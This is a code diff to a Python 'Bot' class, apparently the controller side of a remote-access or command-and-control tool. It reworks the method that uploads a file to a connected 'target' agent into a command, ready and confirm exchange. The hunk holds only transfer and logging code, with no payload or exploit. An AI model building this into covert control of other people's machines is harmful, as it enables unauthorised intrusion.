@@ -79,27 +79,43 @@ class Bot:
             logging.error(f"Error receiving data from Session {self.id}: {e}")
             return None
 
-    def upload_file(self, file_name):
+    def upload_file(self, file_data, filename):
         try:
-            f = open(file_name, 'rb')
-            data = f.read()
-            f.close()
-            logging.info(f"File upload started - Session {self.id} | File: {file_name}")
-        except FileNotFoundError:
-            logging.error(f"File not found - Session {self.id} | File: {file_name}")
-            return f"The file {file_name} does not exist."
-        except IOError as e:
-            logging.error(f"IO Error during file upload - Session {self.id} | File: {file_name} | Error: {e}")
-            return f"Error reading from {file_name}: {e}"
+            # Send command and file info
+            command = {
+                'command': 'upload',
+                'filename': filename,
+                'size': len(file_data)
+            }
+            if not self.reliable_send(command):
+                return False, "Failed to send upload command"
 
-        try:
-            self.target.send(data)
-            logging.info(f"File upload completed - Session {self.id} | File: {file_name}")
-        except socket.error as e:
-            logging.error(f"Socket error during file upload - Session {self.id} | Error: {e}")
-            return f"Error sending data: {e}"
+            # Wait for ready confirmation
+            response = self.reliable_recv()
+            if not response or not response.get('ready'):
+                return False, "Agent not ready to receive file"
 
-        return f"File {file_name} uploaded successfully."
+            # Send file data
+            try:
+                self.target.sendall(file_data)
+                logging.info(f"File data sent - Session {self.id} | File: {filename}")
+            except Exception as e:
+                logging.error(f"Error sending file data - Session {self.id} | Error: {e}")
+                return False, f"Error sending file data: {str(e)}"
+
+            # Get upload confirmation
+            response = self.reliable_recv()
+            if response and response.get('success'):
+                logging.info(f"File upload completed - Session {self.id} | File: {filename}")
+                return True, f"File {filename} uploaded successfully"
+            else:
+                error = response.get('error', 'Upload failed') if response else 'No confirmation received'
+                logging.error(f"Upload failed - Session {self.id} | Error: {error}")
+                return False, error
+
+        except Exception as e:
+            logging.error(f"Upload error - Session {self.id} | Error: {e}")
+            return False, f"Upload error: {str(e)}"
 
     def download_file(self, file_name):
         try:
